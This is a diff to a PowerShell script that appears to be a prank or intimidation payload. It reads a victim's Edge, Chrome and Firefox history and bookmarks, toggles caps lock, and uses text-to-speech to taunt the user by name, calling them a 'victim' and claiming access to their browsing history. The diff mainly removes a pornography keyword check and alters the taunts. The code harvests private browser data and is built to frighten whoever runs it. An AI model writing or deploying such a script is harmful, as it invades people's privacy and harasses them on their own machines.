@@ -311,11 +311,6 @@ $C_his = Get-BrowserData -Browser "chrome" -DataType "history" -ErrorAction Sile
 $C_boo = Get-BrowserData -Browser "chrome" -DataType "bookmarks" -ErrorAction SilentlyContinue
 $F_his = Get-BrowserData -Browser "firefox" -DataType "history" -ErrorAction SilentlyContinue
 
-# if "porn" is found in any of the browser data it will add 1 to $porn
-if ($E_his -match "*porn*" -or $E_Boo -match "*porn*" -or $C_his -match "*porn*" -or $C_boo -match "*porn*" -or $F_his -match "*porn*") {
-    $porn = 1
-}
-
 # caps lock indicator light
 $blinks = 3; $o = New-Object -ComObject WScript.Shell; for ($num = 1 ; $num -le $blinks * 2; $num++) { $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Milliseconds 250 }
 $k = [Math]::Ceiling(100 / 2); $o = New-Object -ComObject WScript.Shell; for ($i = 0; $i -lt $k; $i++) { $o.SendKeys([char] 175) }
@@ -354,7 +349,7 @@ $wshell.Popup("Hello $full_name...", 0, "Error", 32 + 4)
 
 
 $s.Speak("Hello $full_name.")
-$s.Speak("Have you lurned to not piss off hackers yet?")
+# $s.Speak("Have you lurned to not piss off hackers yet?")
 
 if ($ram -gt 63) {
     $s.Speak("You have $ram gigabytes of ram. Really? You dont need that much for watching *THINGS* on the internet $full_name. But a computer this good with no security...")
@@ -385,9 +380,7 @@ else {
     $message = $message + " You have changed your password in $days days. Good job. Guess if you keep this up il have to find a new victim."
 }
 
-if ($porn -eq 1) {
-    $s.Speal("YOU WATCH *THINGS*!, yes i have your browser history.")
-}
+$s.Speak("Nice to see your bwower history is somewhat clean")
 
 $s.Speak($message)
 
